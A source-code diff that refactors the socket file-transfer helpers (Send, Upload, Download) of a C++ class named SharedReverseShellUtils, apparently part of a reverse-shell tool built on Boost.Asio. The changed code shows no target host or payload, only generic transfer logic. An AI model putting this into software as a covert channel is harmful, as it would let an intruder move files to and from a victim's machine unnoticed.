@@ -7,6 +7,7 @@
 #include <iostream>
 #include <filesystem>
 
+#define DEFAULT_BUFFER_SIZE 1024
 
 template<typename T>
 class SharedReverseShellUtils
@@ -15,12 +16,38 @@ public:
 	SharedReverseShellUtils(T * caller)
 		:m_caller(caller) {}
 
-	template<typename Buffer>
-	void Send(Buffer& t_buffer)
+	void Send(const std::string& message)
+	{
+		auto request = message + m_delimiter;
+		auto buf = boost::asio::buffer(request, request.size());
+		Send(buf);
+	}
+
+	void Send(boost::asio::mutable_buffer& t_buffer)
 	{
 		boost::asio::write(m_caller->m_socket, t_buffer, m_errorCode);
 		if (m_errorCode)
 			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
+	}
+
+	void Upload(int fileSize, const std::string& messsageToSend)
+	{
+		Send(messsageToSend);
+
+		while (fileSize > 0)
+		{
+			std::array<char, DEFAULT_BUFFER_SIZE> response;
+			m_caller->m_file.read(response.data(), response.size());
+			if (m_caller->m_file.fail() && !m_caller->m_file.eof())
+				throw std::fstream::failure("Failed while reading file");
+
+			size_t bufferSize(m_caller->m_file.gcount());
+			auto buf = boost::asio::buffer(response.data(), bufferSize);
+			Send(buf);
+
+			fileSize -= bufferSize;
+		}
+		m_caller->m_file.close();
 	}
 
 	void Download(const std::string& filePath)
@@ -28,34 +55,14 @@ public:
 		auto fileSize = std::stoi(Response());
 		while (fileSize > 0)
 		{
-			std::array<char, defaultBufferSize> response;
-			auto bufferSize = (fileSize < defaultBufferSize) ? fileSize : defaultBufferSize;
+			std::array<char, DEFAULT_BUFFER_SIZE> response;
+			auto bufferSize = std::min(fileSize, DEFAULT_BUFFER_SIZE);
 			auto buf = boost::asio::buffer(response, bufferSize);
 			auto responseSize = boost::asio::read(m_caller->m_socket, buf, m_errorCode);
-			m_caller->m_file.write(response.c_str(), responseSize);
+			m_caller->m_file.write(response.data(), responseSize);
 
 			fileSize -= responseSize;
 			std::cout << "Remaining bytes: " << fileSize << "    Response Size: " << responseSize << std::endl;
-		}
-		m_caller->m_file.close();
-	}
-
-	void Upload(int fileSize, boost::asio::buffer& buf)
-	{
-		Send(buf);
-
-		while (fileSize > 0)
-		{
-			std::array<char, defaultBufferSize> response;
-			m_caller->m_file.read(m_caller->response.data(), m_caller->response.size());
-			if (m_caller->m_file.fail() && !m_caller->m_file.eof())
-				throw std::fstream::failure("Failed while reading file");
-
-			size_t bufferSize(m_caller->m_file.gcount());
-			auto buf = boost::asio::buffer(m_caller->response.data(), bufferSize);
-			Send(buf);
-
-			fileSize -= bufferSize;
 		}
 		m_caller->m_file.close();
 	}
@@ -68,7 +75,6 @@ public:
 
 		return CleanReponse(responseSize);
 	}
-
 
 private:
 	std::string CleanReponse(size_t responseSize)
@@ -101,7 +107,7 @@ public:
 
 private:
 	T* m_caller;
-	const int defaultBufferSize = 1024;
+
 public:
 	boost::system::error_code m_errorCode;
 	const std::string m_delimiter = "\r\n\r\n";
